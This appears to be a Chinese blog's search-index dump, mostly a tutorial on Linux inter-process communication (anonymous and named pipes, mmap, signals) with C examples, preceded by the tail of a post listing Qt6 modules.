/tmp/$$&#123;TARGET&#125;/binelse: unix:!android: target.path = /opt/$$&#123;TARGET&#125;/bin!isEmpty(target.path): INSTALLS += target Qt6包含模块 模块 描述 Qt Core 下面其他模块使用的核心基础类（Qt Core是非图形模块） Qt D-Bus 用于通过 D-Bus 协议进行进程间通信的类 Qt GUI 图形用户界面 （GUI） 组件的基类 Qt Network 使网络编程更轻松、更易移植的类 Qt QML QML 和 JavaScript 语言的类 Qt Quick 一个声明性框架，用于构建具有自定义用户界面的高度动态的应用程序。 Qt Quick Controls 提供轻量级 QML 类，用于为桌面、嵌入式和移动设备创建高性能用户界面。这些类型采用简单的样式体系结构，并且非常高效。 Qt Quick Dialogs 用于从 Qt 快速应用程序创建系统对话框并与之交互的类。 Qt Quick Layouts 布局是用于在用户界面中排列基于 Qt Quick 2 的项目的项。 Qt Quick Test QML 应用程序的单元测试框架，其中测试用例编写为 JavaScript 函数。Note: 二进制兼容性保证不适用于Qt快速测试。但是，它将保持源兼容。 Qt Test 用于单元测试 Qt 应用程序和库的类。Note: 二进制兼容性保证不适用于 Qt 测试。但是，它将保持源兼容。 Qt Widgets 使用C++ widget扩展Qt GUI的类。 命名规范和快捷键","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"QT","slug":"编程语言/C/QT","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/QT/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"QT","slug":"QT","permalink":"http://example.com/tags/QT/"}]},{"title":"C++学习 Linux系统编程 进程通信","slug":"C++-学习-Linux系统编程-进程通信","date":"2023-05-08T06:24:26.000Z","updated":"2023-12-15T06:57:01.443Z","comments":true,"path":"2023/05/08/C++-学习-Linux系统编程-进程通信/","link":"","permalink":"http://example.com/2023/05/08/C++-%E5%AD%A6%E4%B9%A0-Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B-%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/","excerpt":"进程间通信简介进程间通讯的概念 进程是一个独立的资源分配单元，不同进程（这里所说的进程通常指的是用户进程）之间的资源是独立的，没有关联，不能在一个进程中直接访问另一个进程的资源。 但是，进程不是孤立的，不同的进程需要进行信息的交互和状态的传递等，因此需要进程间通信( IPC：Inter Processes Communication )。 进程间通信的目的： 数据传输：一个进程需要将它的数据发送给另一个进程。 通知事件：一个进程需要向另一个或一组进程发送消息，通知它（它们）发生了某种事件（如进程终止时要通知父进程）。 资源共享：多个进程之间共享同样的资源。为了做到这一点，需要内核提供互斥和同步机制。 进程控制：有些进程希望完全控制另一个进程的执行（如 Debug 进程），此时控制进程希望能够拦截另一个进程的所有陷入和异常，并能够及时知道它的状态改变。","text":"进程间通信简介进程间通讯的概念 进程是一个独立的资源分配单元，不同进程（这里所说的进程通常指的是用户进程）之间的资源是独立的，没有关联，不能在一个进程中直接访问另一个进程的资源。 但是，进程不是孤立的，不同的进程需要进行信息的交互和状态的传递等，因此需要进程间通信( IPC：Inter Processes Communication )。 进程间通信的目的： 数据传输：一个进程需要将它的数据发送给另一个进程。 通知事件：一个进程需要向另一个或一组进程发送消息，通知它（它们）发生了某种事件（如进程终止时要通知父进程）。 资源共享：多个进程之间共享同样的资源。为了做到这一点，需要内核提供互斥和同步机制。 进程控制：有些进程希望完全控制另一个进程的执行（如 Debug 进程），此时控制进程希望能够拦截另一个进程的所有陷入和异常，并能够及时知道它的状态改变。 Linux进程间通信方式 匿名管道概述 管道也叫无名（匿名）管道，它是是 UNIX 系统 IPC（进程间通信）的最古老形式，所有的 UNIX 系统都支持这种通信机制。 统计一个目录中文件的数目命令：ls | wc –l，为了执行该命令，shell 创建了两个进程来分别执行 ls和 wc。 管道的特点 管道其实是一个在内核内存中维护的缓冲器，这个缓冲器的存储能力是有限的，不同的操作系统大小不一定相同。 管道拥有文件的特质：读操作、写操作，匿名管道没有文件实体，有名管道有文件实体，但不存储数据。可以按照操作文件的方式对管道进行操作。 一个管道是一个字节流，使用管道时不存在消息或者消息边界的概念，从管道读取数据的进程可以读取任意大小的数据块，而不管写入进程写入管道的数据块的大小是多少。 通过管道传递的数据是顺序的，从管道中读取出来的字节的顺序和它们被写入管道的顺序是完全一样的。 在管道中的数据的传递方向是单向的，一端用于写入，一端用于读取，管道是半双工的。 从管道读数据是一次性操作，数据一旦被读走，它就从管道中被抛弃，释放空间以便写更多的数据，在管道中无法使用 lseek() 来随机的访问数据。 匿名管道只能在具有公共祖先的进程（父进程与子进程，或者两个兄弟进程，具有亲缘关系）之间使用。 为什么可以使用管道进行通信 管道的数据结构 pipe函数12345678910#include&lt;unistd.h&gt;int pipe(int pipefd[2]);//功能：创建一个匿名管道，用来进程间通信//参数：//int pipefd[2]这个数组是一个传出参数//pipefd[0]对应的是管道的读端，pipefd[1]对应的是管道的写端//返回值： //成功返回0，失败返回-1//注意：匿名管道只能用于具有关系的进程之间的通信（父子进程，兄弟进程）//管道是默认阻塞的，如果管道中没有数据，read阻塞，如果管道满了，write阻塞 案例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main() &#123; // 在fork之前创建管道 int pipefd[2]; int ret = pipe(pipefd); if (ret == -1) &#123; perror(&quot;pipe&quot;); exit(0); &#125; // 创建子进程 pid_t pid = fork(); if (pid &gt; 0) &#123; // 父进程 printf(&quot;i am prent process, pid : %d\\n&quot;, getpid()); // 关闭写端 close(pipefd[1]); // 从管道的读取端读取数据 char buf[1024] = &#123; 0 &#125;; while (1) &#123; int len = read(pipefd[0], buf, sizeof(buf)); printf(&quot;parent recv : %s, pid : %d\\n&quot;, buf, getpid()); // 向管道中写入数据 char * str = &quot;hello,i am parent&quot;; write(pipefd[1], str, strlen(str)); sleep(1); &#125; &#125; else if (pid == 0) &#123; // 子进程 printf(&quot;i am child process, pid : %d\\n&quot;, getpid()); // 关闭读端 close(pipefd[0]); char buf[1024] = &#123; 0 &#125;; while (1) &#123; // 向管道中写入数据 char* str = &quot;hello,i am child&quot;; write(pipefd[1], str, strlen(str)); sleep(1); int len = read(pipefd[0], buf, sizeof(buf)); printf(&quot;child recv : %s, pid : %d\\n&quot;, buf, getpid()); // bzero(buf, 1024); &#125; &#125; return 0;&#125; 运行结果如下： 匿名管道的使用 创建匿名管道 12#include&lt;unistd.h&gt;int pipe(int pipefd[2]); 查看管道缓冲大小命令 1ulimit -a 查看管道缓冲大小函数 12#include&lt;unistd.h&gt;long fpathconf(int fd, int name); 123456789101112131415#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main()&#123; int pipefd[2]; int ret = pipe(pipefd); long size = fpathconf(pipefd[0], _PC_PIPE_BUF);//获取管道的大小 printf(&quot;pipe size : %ld\\n&quot;, size); return 0;&#125; 编译运行，结果为： 一个案例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263/* 实现ps aux | grep xxx 父子进程之间通信 子进程：ps aux，子进程结束以后，将数据发送给父进程 父进程：获取到数据，过滤 pipe() execlp() 子进程将标准输出stdout_fileno重定向到管道写端。dup2 没有实现过滤功能*/#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;wait.h&gt;int main()&#123; //创建一个管道 int fd[2]; int ret = pipe(fd); if (ret == -1) &#123; perror(&quot;pipe&quot;); exit(0); &#125; //创建子进程 pid_t pid = fork(); if (pid &gt; 0) &#123; //父进程 //关闭写端 close(fd[1]); //从管道中读取 char buf[1024] = &#123; 0 &#125;; int len = -1; //过滤数据输出 while ((len = read(fd[0], buf, sizeof(buf) - 1)) &gt; 0) &#123; printf(&quot;%s&quot;, buf); memset(buf, 0, 1024); &#125; wait(NULL); &#125; else if (pid == 0) &#123; //子进程 //关闭读端 close(fd[0]); //文件描述符的重定向 stdout_fileno -&gt; fd[1] dup2(fd[1], STDOUT_FILENO); //执行 ps aux execlp(&quot;ps&quot;, &quot;ps&quot;, &quot;aux&quot;, NULL); perror(&quot;execlp&quot;); exit(0); &#125; else &#123; perror(&quot;fork&quot;); exit(0); &#125; } 运行结果为： 因为管道只有4096bytes，所以运行这个程序只会显示4096bytes，如果要显示所有的信息需要循环往管道中写数据 管道的读写特点和管道设置为非阻塞管道的读写特点： 使用管道时，需要注意以下几种特殊的情况（假设都是阻塞的I&#x2F;O操作） 所有的指向管道写端的文件描述符都关闭了（管道写端引用计数为0），有进程从管道的读端读数据，那么管道中剩余的数据被读取以后，再次read会返回0，就像读到文件末尾一样。 如果有指向管道写端的文件描述符没有关闭（管道的写端引用计数大于0），而持有管道写端的进程也没有往管道中写数据，这个时候有进程从管道中读取数据，那么管道中剩余的数据被读取后，再次read会阻塞，直到管道中有数据可以读了，才读取数据并返回。 如果所有指向管道读端的文件描述符都关闭（管道的读端引用计数大于0），这个时候有进程向管道中写数据，那么该进程会收到一个信号SIGPIPE，通常会导致进程异常终止。 如果有指向管道读端的文件描述符没有关闭（管道的读端引用计数大于0），而持有管道读端的进程也没有从管道中读数据，这时有进程向管道中写数据，那么在管道在写满时再次write会阻塞，直到管道中有空位置才能写入数据并返回。 总结： 读管道 管道中有数据，read返回实际读到的字节数 管道中无数据： 写端被全部关闭，read返回0，相当于读到文件的末尾 写端没有完全关闭，read阻塞等待 写管道： 管道读端全部关闭，进程异常终止（进程收到SIGPIPE信号） 管道读端没有全部关闭： 管道已满：write阻塞 管道未满：write将数据写入，并返回实际写入的字节数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;/* 设置管道非阻塞 int flags = fcntl(fd[0], F_GETFL); // 获取原来的flag flags |= O_NONBLOCK; // 修改flag的值 fcntl(fd[0], F_SETFL, flags); // 设置新的flag*/int main() &#123; // 在fork之前创建管道 int pipefd[2]; int ret = pipe(pipefd); if(ret == -1) &#123; perror(&quot;pipe&quot;); exit(0); &#125; // 创建子进程 pid_t pid = fork(); if(pid &gt; 0) &#123; // 父进程 printf(&quot;i am parent process, pid : %d\\n&quot;, getpid()); // 关闭写端 close(pipefd[1]); // 从管道的读取端读取数据 char buf[1024] = &#123;0&#125;; int flags = fcntl(pipefd[0], F_GETFL); // 获取原来的flag flags |= O_NONBLOCK; // 修改flag的值 fcntl(pipefd[0], F_SETFL, flags); // 设置新的flag while(1) &#123; int len = read(pipefd[0], buf, sizeof(buf)); printf(&quot;len : %d\\n&quot;, len); printf(&quot;parent recv : %s, pid : %d\\n&quot;, buf, getpid()); memset(buf, 0, 1024); sleep(1); &#125; &#125; else if(pid == 0)&#123; // 子进程 printf(&quot;i am child process, pid : %d\\n&quot;, getpid()); // 关闭读端 close(pipefd[0]); char buf[1024] = &#123;0&#125;; while(1) &#123; // 向管道中写入数据 char * str = &quot;hello,i am child&quot;; write(pipefd[1], str, strlen(str)); sleep(5); &#125; &#125; return 0;&#125; 运行结果为： 匿名管道，由于没有名字，只能用于亲缘关系的进程间通信。为了克服这个缺点，提出了有名管道（FIFO），也叫命名管道、FIFO文件。 有名管道（FIFO）不同于匿名管道之处在于它提供了一个路径名与之关联，以 FIFO 的文件形式存在于文件系统中，并且其打开方式与打开一个普通文件是一样的，这样即使与 FIFO 的创建进程不存在亲缘关系的进程，只要可以访问该路径，就能够彼此通过 FIFO 相互通信，因此，通过 FIFO 不相关的进程也能交换数据。 一旦打开了 FIFO，就能在它上面使用与操作匿名管道和其他文件的系统调用一样的I&#x2F;O系统调用了（如read()、write()和close()）。与管道一样，FIFO 也有一个写入端和读取端，并且从管道中读取数据的顺序与写入的顺序是一样的。FIFO 的名称也由此而来：先入先出。 有名管道（FIFO)和匿名管道（pipe）有一些特点是相同的，不一样的地方在于： FIFO 在文件系统中作为一个特殊文件存在，但 FIFO 中的内容却存放在内存中。 当使用 FIFO 的进程退出后，FIFO 文件将继续保存在文件系统中以便以后使用。 FIFO 有名字，不相关的进程可以通过打开有名管道进行通信。 有名管道的使用 通过命令创建有名管道 1mkfifo 名字 通过函数创建有名管道 123#include&lt;sys/types.h&gt;#include&lt;sys/stat.h&gt;int mkfifo(const char *pathname, mode_t mode); 一旦使用mkfifo创建了一个FIFO，就可以使用open打开它，常见的文件I&#x2F;O函数都可用于fifo。如：close、read、write、unlink等。 FIFO严格遵循先进先出，对管道及FIFO的读总是从开始处返回数据，对它们的写则是把数据添加到末尾。它们不支持诸如lseek()等文件定位操作。 mkfifo命令 mkfifo函数12345678#include&lt;sys/types.h&gt;#include&lt;sys/stat.h&gt;int mkfifo(const char *pathname, mode_t mode);//参数：//- pathname：管道名称路径//- mode：文件的权限，和open的权限是一样的//返回值//成功返回0，失败返回-1，并设置错误号 1234567891011121314#include&lt;stdio.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/stat.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int ret = mkfifo(&quot;fifo1&quot;, 0664); if (ret == -1) &#123; perror(&quot;mkfifo&quot;); exit(0); &#125;&#125; 有名管道通信案例write.c往管道中写入数据 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647//向管道中写数据#include&lt;stdio.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/stat.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;#include&lt;fcntl.h&gt;#include&lt;string.h&gt;int main()&#123; //1、判断文件是否存在 int ret = access(&quot;test&quot;, F_OK); if (ret == -1) &#123; printf(&quot;管道不存在，创建管道\\n&quot;); //2、创建管道文件 ret = mkfifo(&quot;test&quot;, 0664); if (ret == -1) &#123; perror(&quot;mkfifo&quot;); exit(0); &#125; &#125; //3、以只写的方式打开管道 int fd = open(&quot;test&quot;, O_WRONLY); if (fd == -1) &#123; perror(&quot;open&quot;); exit(0); &#125; //写数据 for (int i = 0;i &lt; 100;i++) &#123; char buf[1024]; sprintf(buf, &quot;hello , %d\\n&quot;, i); printf(&quot;write data : %s\\n&quot;, buf); write(fd, buf, strlen(buf)); sleep(1); &#125; close(fd);&#125; read.c往管道中读数据 123456789101112131415161718192021222324252627282930//向管道中读数据#include&lt;stdio.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/stat.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;#include&lt;fcntl.h&gt;int main()&#123; //1、打开管道文件 int fd = open(&quot;test&quot;,O_RDONLY); if (fd == -1) &#123; perror(&quot;open&quot;); exit(0); &#125; //读数据 while (1) &#123; char buf[1024] = &#123; 0 &#125;; int len = read(fd, buf, sizeof(buf)); if (len == 0) &#123; printf(&quot;写端断开连接了....\\n&quot;); &#125; printf(&quot;recv buf : %s\\n&quot;, buf); &#125; close(fd);&#125; 运行结果为： 有名管道注意事项 一个为只读而打开的一个管道的进程会阻塞，直到另一个进程为写打开管道 一个为只写而打开一个管道的进程会阻塞，直到另一个进程为只读打开管道 读管道： 管道中有数据，read返回实际读到的字节数 管道中无数据 管道写端被全部关闭，read返回0，（相当于读到文件末尾） 写端没有被全部关闭，read会阻塞等待 写管道： 管道读端被全部关闭，进程会异常终止（收到一个SIGPIPE信号） 管道读端没有全部关闭 管道已经满了，write会阻塞 管道没有满，write将数据写入，并返回实际写入的字节数 有名管道实现简单版聊天功能使用有名管道完成聊天的功能 进程A 以只写的方式打开管道1 以只读的方式打开管道2 循环的写读数据 while(1) { 获取键盘录入fgets 写管道1 读管道2} 进程A 以只写的方式打开管道1 以只读的方式打开管道2 循环的写读数据 while(1) { 读管道1 获取键盘录入fgets} chatA.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;int main() &#123; // 1.判断有名管道文件是否存在 int ret = access(&quot;fifo1&quot;, F_OK); if (ret == -1) &#123; // 文件不存在 printf(&quot;管道不存在，创建对应的有名管道\\n&quot;); ret = mkfifo(&quot;fifo1&quot;, 0664); if (ret == -1) &#123; perror(&quot;mkfifo&quot;); exit(0); &#125; &#125; ret = access(&quot;fifo2&quot;, F_OK); if (ret == -1) &#123; // 文件不存在 printf(&quot;管道不存在，创建对应的有名管道\\n&quot;); ret = mkfifo(&quot;fifo2&quot;, 0664); if (ret == -1) &#123; perror(&quot;mkfifo&quot;); exit(0); &#125; &#125; // 2.以只写的方式打开管道fifo1 int fdw = open(&quot;fifo1&quot;, O_WRONLY); if (fdw == -1) &#123; perror(&quot;open&quot;); exit(0); &#125; printf(&quot;打开管道fifo1成功，等待写入...\\n&quot;); // 3.以只读的方式打开管道fifo2 int fdr = open(&quot;fifo2&quot;, O_RDONLY); if (fdr == -1) &#123; perror(&quot;open&quot;); exit(0); &#125; printf(&quot;打开管道fifo2成功，等待读取...\\n&quot;); char buf[128]; // 4.循环的写读数据 while (1) &#123; memset(buf, 0, 128); // 获取标准输入的数据 fgets(buf, 128, stdin); // 写数据 ret = write(fdw, buf, strlen(buf)); if (ret == -1) &#123; perror(&quot;write&quot;); exit(0); &#125; // 5.读管道数据 memset(buf, 0, 128); ret = read(fdr, buf, 128); if (ret &lt;= 0) &#123; perror(&quot;read&quot;); break; &#125; printf(&quot;buf: %s\\n&quot;, buf); &#125; // 6.关闭文件描述符 close(fdr); close(fdw); return 0;&#125; chatB.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;int main() &#123; // 1.判断有名管道文件是否存在 int ret = access(&quot;fifo1&quot;, F_OK); if (ret == -1) &#123; // 文件不存在 printf(&quot;管道不存在，创建对应的有名管道\\n&quot;); ret = mkfifo(&quot;fifo1&quot;, 0664); if (ret == -1) &#123; perror(&quot;mkfifo&quot;); exit(0); &#125; &#125; ret = access(&quot;fifo2&quot;, F_OK); if (ret == -1) &#123; // 文件不存在 printf(&quot;管道不存在，创建对应的有名管道\\n&quot;); ret = mkfifo(&quot;fifo2&quot;, 0664); if (ret == -1) &#123; perror(&quot;mkfifo&quot;); exit(0); &#125; &#125; // 2.以只读的方式打开管道fifo1 int fdr = open(&quot;fifo1&quot;, O_RDONLY); if (fdr == -1) &#123; perror(&quot;open&quot;); exit(0); &#125; printf(&quot;打开管道fifo1成功，等待读取...\\n&quot;); // 3.以只写的方式打开管道fifo2 int fdw = open(&quot;fifo2&quot;, O_WRONLY); if (fdw == -1) &#123; perror(&quot;open&quot;); exit(0); &#125; printf(&quot;打开管道fifo2成功，等待写入...\\n&quot;); char buf[128]; // 4.循环的读写数据 while (1) &#123; // 5.读管道数据 memset(buf, 0, 128); ret = read(fdr, buf, 128); if (ret &lt;= 0) &#123; perror(&quot;read&quot;); break; &#125; printf(&quot;buf: %s\\n&quot;, buf); memset(buf, 0, 128); // 获取标准输入的数据 fgets(buf, 128, stdin); // 写数据 ret = write(fdw, buf, strlen(buf)); if (ret == -1) &#123; perror(&quot;write&quot;); exit(0); &#125; &#125; // 6.关闭文件描述符 close(fdr); close(fdw); return 0;&#125; 运行结果为： 内存映射 内存映射相关系统调用1234567891011121314151617181920212223242526272829#include&lt;sys/mman.h&gt;void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);//功能：//映射或解除映射一个设备到内存中//参数：//- void *addr：NULL，由内核指定//- length：要映射的数据的长度，不能为0，建议使用文件的长度//- int prot：对申请的内存映射区的操作权限// PROT_EXEC：可执行的权限// PROT_WRITE：读权限// PROT_WRITE：写权限// PROT_NONE：没有权限// 要操作映射区内存，必须要有读权限//- flags：// MAP_SHEARED：映射区数据会自动和磁盘文件同步，进程间通信必须要设置这个选项// MAP_PRIVATE：不同步，内存映射区的数据变了，对原来的数据不会修改，会重新创建一个新的文件。（copy on write）//- fd：需要映射的那个文件的文件描述符// 通过open得到，open的是一个磁盘文件// 注意文件大小不能为0，open指定的权限不能和prot参数有冲突// open：只读/读写 prot：PROT_READ// open：读写 prot:PROT_READ | PROT_WRITE//- offset：偏移量，一般不用，必须指定为4K的整数倍，0表示不偏移//- 返回值：返回创建的内存首地址，失败返回MAP_FAILED:(void*)-1 -1int munmap(void *addr, size_t length); int munmap(void *addr, size_t length);//功能：释放内存映射//参数：//- addr：要释放的内存首地址//- length：要释放的内存大小，要和mmap函数中的length参数的值一样 案例：父子进程使用内存映射通信12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758//使用内存映射实现进程间通信//1、父子进程// - 还没有子进程的时候// - 通过唯一的父进程创建内存映射区// - 有了内存映射区以后再创建子进程// - 父子进程之间共享创建的内存映射区//2、没有关系的进程间通信// - 准备一个大小不为0的磁盘文件 // - 进程1通过磁盘文件创建内存映射区// - 得到一个操作这块内存的指针// - 进程2通过磁盘文件创建内存映射区// - 得到一个操作这块内存的指针// - 使用内存映射区进行通信//注意内存映射区通信不会阻塞#include&lt;stdio.h&gt;#include&lt;sys/mman.h&gt;#include&lt;fcntl.h&gt;#include&lt;unistd.h&gt;#include&lt;sys/types.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#include&lt;wait.h&gt;int main()&#123; //1、打开一个文件 int fd = open(&quot;test.txt&quot;, O_RDWR); int size = lseek(fd, 0, SEEK_END);//获取文件的大小 //2、创建内存映射区 void* ptr = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); if (ptr == MAP_FAILED) &#123; perror(&quot;mmap&quot;); exit(0); &#125; //3、创建子进程 pid_t pid = fork(); if (pid &gt; 0) &#123; wait(NULL); //父进程 strcpy((char*)ptr, &quot;hello,child&quot;); &#125; else if (pid == 0) &#123; //子进程 char buf[64]; strcpy(buf, (char*)ptr); printf(&quot;read data : %s\\n&quot;, buf); &#125; //关闭内存映射区 munmap(ptr, size);&#125; 运行结果为： 思考问题 如果对mmap的返回值(ptr)做++操作(ptr++), munmap是否能够成功? void* ptr &#x3D; mmap(…); ptr++; 可以对其进行++操作 munmap(ptr,len); 错误 如果open时O_RDONLY, mmap时prot参数指定PROT_READ | PROT_WRITE会怎样? 错误，会返回MAP_FAILED open()函数中的权限建议prot参数的权限保持一致 如果文件偏移量为1000会怎样? 偏移量必须是4K的整数倍，一般会返回MAP_FAILED mmap什么情况下会调用失败? 第二个参数：length &#x3D; 0 第三个参数： prot - 只指定了写权限 - prot PROT_READ | PROT_WRITE 第五个参数fd通过open函数时指定的O_RDONLY &#x2F; O_WRONLY 可以open的时候O_CREAT一个新文件来创建映射区吗？ 可以，但是如果创建的文件的大小不能为0 可以对新的文件进行拓展 - lseek() - truncate() mmap后关闭文件描述符，对mmap映射有没有影响？ int fd &#x3D; open(“XXX”); mmap(,,,,fd,0); close(fd); 映射区还是存在的，创建映射区的fd被关闭，没有任何影响 对ptr越界操作会怎样？ void* ptr &#x3D; mmap(NULL,100,,,); 4K 越界操作，操作的是非法内存-&gt;段错误 案例：使用内存映射进行文件拷贝1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859//使用内存映射实现文件拷贝功能//1、对原始文件进行内存映射//2、创建一个新文件（拓展该文件）//3、把新文件的数据映射到内存中//4、通过内存拷贝将第一个文件的内存数据拷贝到新的文件内存中//5、释放资源#include&lt;stdio.h&gt;#include&lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include&lt;unistd.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;int main()&#123; //1、对原始文件进行内存映射 int fd = open(&quot;english.txt&quot;, O_RDWR); if (fd == -1) &#123; perror(&quot;open&quot;); exit(0); &#125; //获取原始文件的大小 int len = lseek(fd, 0, SEEK_END); //2、创建一个新文件 （拓展该文件） int fd1 = open(&quot;cpy.txt&quot;, O_RDWR | O_CREAT,0664); if (fd1 == -1) &#123; perror(&quot;open&quot;); exit(0); &#125; //对新创建的文件进行拓展 truncate(&quot;cpy.txt&quot;, len); write(fd1, &quot; &quot;, 1); //3、分别做内存映射 void* ptr1 = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); void* ptr2 = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd1, 0); if (ptr1 == MAP_FAILED) &#123; perror(&quot;mmap&quot;); exit(0); &#125; if (ptr2 == MAP_FAILED) &#123; perror(&quot;mmap&quot;); exit(0); &#125; //内存拷贝 memcpy(ptr2, ptr1, len); //释放资源 munmap(ptr1, len); munmap(ptr2, len); close(fd); close(fd1);&#125; 案例：父子进程使用匿名映射通信123456789101112131415161718192021222324252627282930313233343536373839404142434445464748//匿名映射：不需要文件实体#include&lt;stdio.h&gt;#include&lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include&lt;unistd.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#include&lt;wait.h&gt;int main()&#123; //1、创建匿名内存映射区 int len = 4096; void* ptr = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0); if (ptr == MAP_FAILED) &#123; perror(&quot;mmap&quot;); exit(0); &#125; //父子间进程通信 pid_t pid = fork(); if (pid &gt; 0) &#123; //父进程 strcpy((char*)ptr, &quot;hello,world&quot;); wait(NULL); &#125; else if (pid == 0) &#123; //子进程 sleep(1); printf(&quot;%s\\n&quot;, (char*)ptr); &#125; //释放内存映射区 int ret = munmap(ptr, len); if (ret == -1) &#123; perror(&quot;munmap&quot;); exit(0); &#125;&#125; 信号概述信号的概念 信号是 Linux 进程间通信的最古老的方式之一，是事件发生时对进程的通知机制，有时也称之为软件中断，它是在软件层次上对中断机制的一种模拟，是一种异步通信的方式。信号可以导致一个正在运行的进程被另一个正在运行的异步进程中断，转而处理某一个突发事件。 发往进程的诸多信号，通常都是源于内核。引发内核为进程产生信号的各类事件如下： 对于前台进程，用户可以通过输入特殊的终端字符来给它发送信号。比如输入Ctrl+C通常会给进程发送一个中断信号。 硬件发生异常，即硬件检测到一个错误条件并通知内核，随即再由内核发送相应信号给相关进程。比如执行一条异常的机器语言指令，诸如被 0 除，或者引用了无法访问的内存区域。 系统状态变化，比如 alarm 定时器到期将引起 SIGALRM 信号，进程执行的 CPU时间超限，或者该进程的某个子进程退出。 运行 kill 命令或调用 kill 函数。 使用信号的两个主要目的是： 让进程知道已经发生了一个特定的事情。 强迫进程执行它自己代码中的信号处理程序。 信号的特点： 简单 不能携带大量信息 满足某个特定条件才发送 优先级比较高 查看系统定义的信号列表：kill -l 前 31 个信号为常规信号，其余为实时信号 重点信号 编号 信号名称 对应事件 默认动作 2 SIGINT 当用户按下了&lt;Ctrl+C&gt;组合键时，用户终端向正 在运行中的由该终端启动的程序发出此信号 终止进程 3 SIGQUIT 用户按下&lt;Ctrl+&gt;组合键时产生该信号，用户终 端向正在运行中的由该终端启动的程序发出些信号 终止进程 9 SIGKILL 无条件终止进程。该信号不能被忽略，处理和阻塞 终止进程，可以杀死任何进程 11 SIGSEGV 指示进程进行了无效内存访问(段错误) 终止进程并产生core文件 13 SIGPIPE Broken pipe向一个没有读端的管道写数据 终止进程 17 SIGCHLD 子进程结束时，父进程会收到这个信号 忽略这个信号 18 SIGCONT 如果进程已停止，则使其继续运行 继续&#x2F;忽略 19 SIGSTOP 停止进程的执行。信号不能被忽略，处理和阻塞 为终止进程 信号的5种默认处理动作 查看信号的详细信息：man 7 signal 信号的5种默认处理动作 Term 终止进程 Ign 当前进程忽略掉这个信号 Core 终止进程，并生成一个Core文件 Stop 暂停当前进程 Cont 继续执行当前被暂停的进程 信号的几种状态：产生、未决、递达 SIGKILL和SIGSTOP信号不能被捕捉、阻塞或者阻塞，只能执行默认动作 Core动作123456789#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123; char* buf; strcpy(buf, &quot;hello&quot;);&#125; 我们建立一个core.c文件，这个文件肯定是会运行错误的，char* buf是一个野内存，我们访问这个内存是进行了一个非法操作 我们运行 1ulimit -a 查看core文件大小的限制 大小限制为0表示不会生成core文件 运行 1ulimit -c 1024 修改core文件限制，此时我们编译运行core.c文件 发现错误，并且生成了一个core文件，如果没有生成core文件，可能是由于ubuntu预装了apport错误收集系统，运行命令 1sudo service apport stop 再次运行，发现生成了一个core文件 调试一下a.out程序 可以看到core文件中的错误信息 信号相关函数kill函数12345678910111213#include&lt;sys/types.h&gt;#include&lt;signal.h&gt;int kill(pid_t pid,int sig);//功能：给任何进程或进程组，发送任何信号sig//参数：// - pid：需要发送给的进程的pid// &gt;0：将信号发送给指定的进程// =0：将信号发送给当前的进程组// =-1：将信号发送给每一个有权限接受这个信号的进程// &lt;-1：这个pid=某个进程组的id取反// - sig：需要发送的信号或者宏值，0表示不发送任何信号kil(getppid(),9);//给父进程发送一个9号信号kil(getpid(),9);//给自己发送一个9号信号 raise函数1234567int raise(int sig);//功能：给当前的进程发送信号//参数：// - 